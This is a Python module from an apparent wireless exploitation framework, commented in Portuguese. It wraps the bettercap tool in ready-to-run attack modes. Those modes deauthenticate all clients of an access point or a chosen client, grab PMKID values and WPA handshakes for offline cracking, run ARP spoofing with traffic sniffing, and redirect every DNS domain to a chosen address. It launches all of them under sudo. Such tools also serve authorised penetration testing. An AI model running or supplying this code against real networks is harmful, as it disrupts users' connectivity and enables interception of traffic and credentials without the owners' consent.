#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess for bettercap (GPL-3.0) — Wi-Fi, BLE, MITM e API REST.

Invoca o binário ``bettercap`` sem importar código GPL: apenas monta a linha de
comando (-iface, -eval, -caplet, -silent). Cobre recon Wi-Fi, deauth, PMKID
(clientless), captura de handshake, ARP/DNS spoof, sniff com PCAP, BLE recon,
execução de caplets e sessão com API REST (parâmetros mapeados para
``api.rest.*`` via ``-eval``, compatível com o upstream atual).

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

_VALID_MODES = (
    "wifi_recon",
    "wifi_deauth",
    "wifi_pmkid",
    "wifi_handshake",
    "arp_spoof",
    "dns_spoof",
    "ble_recon",
    "caplet",
    "api",
)


class Exploit(Exploit):
    """Bridge subprocess para bettercap (Wi-Fi, BLE, MITM, caplets, API REST)."""

    __info__ = {
        "name": "bettercap Bridge",
        "description": (
            "Orquestra bettercap (GPL-3.0 subprocess): wifi.recon, wifi.deauth, "
            "wifi.assoc (PMKID), handshake para arquivo, arp.spoof/dns.spoof com "
            "net.sniff, http.proxy/https.proxy (via -eval), ble.recon, caplets "
            "customizados e API REST (bind/auth via módulo api.rest em -eval). "
            "Licença: apenas subprocesso; não há linkage com código GPL."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "bettercap contributors (GPL-3.0, invoked as subprocess)",
        ),
        "references": (
            "https://github.com/bettercap/bettercap",
            "https://www.bettercap.org/",
        ),
        "devices": ("wifi", "ble", "lan"),
    }

    interface = OptString("wlan0", "Interface de rede (ex.: wlan0, eth0, hci0)")
    mode = OptString(
        "wifi_recon",
        "Modo: wifi_recon | wifi_deauth | wifi_pmkid | wifi_handshake | "
        "arp_spoof | dns_spoof | ble_recon | caplet | api",
    )
    target_bssid = OptString("", "BSSID alvo (ataques Wi-Fi)")
    target_client = OptString(
        "",
        "MAC do cliente: com alvo, usa wifi.fake_auth BSSID CLIENT (desassociação direcionada); "
        "vazio usa wifi.deauth no AP (todos os clientes)",
    )
    caplet_path = OptString("", "Caminho do arquivo caplet (modo caplet ou caplet custom)")
    eval_commands = OptString(
        "",
        "Sequência de comandos separados por ; para -eval (substitui o script padrão do modo se preenchido)",
    )
    api_address = OptString(
        "127.0.0.1:8081",
        "Endereço:porta REST (mapeado para api.rest.address / api.rest.port via -eval)",
    )
    api_token = OptString(
        "",
        "Token/senha REST (mapeado para api.rest.password quando modo api e sem eval custom)",
    )
    output_pcap = OptString(
        "",
        "Saída PCAP: net.sniff.output ou wifi.handshakes.file conforme o modo",
    )
    silent = OptBool(False, "Passa -silent ao bettercap")
    dry_run = OptBool(False, "Exibe o comando sem executar")

    def _find_bettercap(self) -> Optional[str]:
        """Localiza o binário ``bettercap`` no PATH.

        Returns:
            Caminho absoluto ou nome no PATH, ou None se ausente.
        """
        return shutil.which("bettercap")

    def _parse_api_bind(self) -> Tuple[str, str]:
        """Extrai host e porta de ``api_address``.

        Returns:
            Tupla (host, port) com porta padrão 8081 se omitida.
        """
        raw = str(self.api_address).strip()
        if not raw:
            return "127.0.0.1", "8081"
        if ":" in raw:
            host, _, port = raw.rpartition(":")
            host = host.strip() or "127.0.0.1"
            port = port.strip() or "8081"
            return host, port
        return raw, "8081"

    def _prepend_output(self, script: str, *, handshake_file: bool) -> str:
        """Prefixa definição de arquivo de captura quando ``output_pcap`` está definido.

        Args:
            script: Comandos bettercap (sem ponto e vírgula final obrigatório).
            handshake_file: Se True, usa ``wifi.handshakes.file``; senão ``net.sniff.output``.

        Returns:
            Script com prefixo de saída, se aplicável.
        """
        outp = str(self.output_pcap).strip()
        if not outp:
            return script
        outp = str(Path(outp).expanduser())
        key = "wifi.handshakes.file" if handshake_file else "net.sniff.output"
        return "set {} {}; {}".format(key, outp, script)

    def _default_eval_for_mode(self) -> Optional[str]:
        """Monta a sequência ``-eval`` padrão para o ``mode`` atual.

        Returns:
            String de comandos ou None se o modo não usar ``-eval`` por padrão.
        """
        m = str(self.mode).strip()
        bssid = str(self.target_bssid).strip()
        client = str(self.target_client).strip()

        if m == "wifi_recon":
            body = "wifi.recon on"
            if str(self.output_pcap).strip():
                body = "{}; net.sniff on".format(body)
            return self._prepend_output(body, handshake_file=False)

        if m == "wifi_deauth":
            if not bssid:
                return None
            if client:
                body = "wifi.recon on; wifi.fake_auth {} {}".format(bssid, client)
            else:
                body = "wifi.recon on; wifi.deauth {}".format(bssid)
            return self._prepend_output(body, handshake_file=False)

        if m == "wifi_pmkid":
            if not bssid:
                return None
            body = "wifi.recon on; wifi.assoc {}".format(bssid)
            return self._prepend_output(body, handshake_file=False)

        if m == "wifi_handshake":
            outp = str(self.output_pcap).strip()
            if not outp:
                outp = str(Path.cwd() / "wpa-handshake.pcap")
            path = str(Path(outp).expanduser())
            return "set wifi.handshakes.file {}; wifi.recon on".format(path)

        if m == "arp_spoof":
            body = "arp.spoof on; net.probe on; net.sniff on"
            return self._prepend_output(body, handshake_file=False)

        if m == "dns_spoof":
            body = (
                "set dns.spoof.domains *; set dns.spoof.address 10.0.0.1; "
                "dns.spoof on; net.sniff on"
            )
            return self._prepend_output(body, handshake_file=False)

        if m == "ble_recon":
            return "ble.recon on"

        if m == "caplet":
            return None

        if m == "api":
            host, port = self._parse_api_bind()
            parts = [
                "set api.rest.address {}".format(host),
                "set api.rest.port {}".format(port),
            ]
            tok = str(self.api_token).strip()
            if tok:
                parts.append("set api.rest.password {}".format(tok))
            parts.append("api.rest on")
            return "; ".join(parts)

        return None

    def _resolve_eval(self) -> Optional[str]:
        """Resolve a string final de ``-eval`` (custom ou padrão).

        Returns:
            Comandos para ``-eval`` ou None se não houver nada a passar.
        """
        custom = str(self.eval_commands).strip()
        if custom:
            return custom
        return self._default_eval_for_mode()

    def _build_command(self) -> List[str]:
        """Monta argv para ``subprocess`` (sudo bettercap ...).

        Returns:
            Lista de argumentos do processo.

        Raises:
            FileNotFoundError: Se bettercap não estiver no PATH.
            ValueError: Se parâmetros obrigatórios do modo estiverem ausentes.
        """
        bc = self._find_bettercap()
        if not bc:
            raise FileNotFoundError(
                "bettercap não encontrado no PATH. Instale bettercap "
                "(https://github.com/bettercap/bettercap)."
            )

        m = str(self.mode).strip()
        if m not in _VALID_MODES:
            raise ValueError(
                "Modo inválido '{}'. Use: {}".format(m, ", ".join(_VALID_MODES)),
            )

        cmd: List[str] = ["sudo", bc]

        if str(self.interface).strip():
            cmd.extend(["-iface", str(self.interface).strip()])

        if self.silent:
            cmd.append("-silent")

        cap = str(self.caplet_path).strip()
        if m == "caplet":
            if not cap or not os.path.isfile(cap):
                raise ValueError(
                    "modo caplet exige caplet_path apontando para um arquivo existente.",
                )
            cmd.extend(["-caplet", str(Path(cap).expanduser().resolve())])
        elif cap:
            cap_p = Path(cap).expanduser()
            if not cap_p.is_file():
                raise ValueError("caplet_path deve existir e ser um arquivo.")
            cmd.extend(["-caplet", str(cap_p.resolve())])

        ev = self._resolve_eval()
        if m == "wifi_deauth" or m == "wifi_pmkid":
            if not str(self.eval_commands).strip() and not str(self.target_bssid).strip():
                raise ValueError(
                    "Modo {} exige target_bssid (ou eval_commands completo).".format(m),
                )
        if ev:
            cmd.extend(["-eval", ev])

        return cmd

    def run(self) -> None:
        """Executa bettercap como subprocesso."""
        try:
            cmd = self._build_command()
        except (FileNotFoundError, ValueError) as err:
            print_error(str(err))
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — comando bettercap:")
            print_status(cmd_str)
            logger.debug("bettercap argv=%s", cmd)
            return

        print_status("Iniciando bettercap (modo {})...".format(self.mode))
        print_info("Interface: {}".format(self.interface))
        print_info("Comando: {}".format(cmd_str))
        print_info("Ctrl+C encerra a sessão.")

        try:
            subprocess.run(cmd, check=False)
        except KeyboardInterrupt:
            print_info("\nbettercap interrompido pelo usuário.")
        except Exception as err:
            print_error("bettercap falhou: {}".format(err))
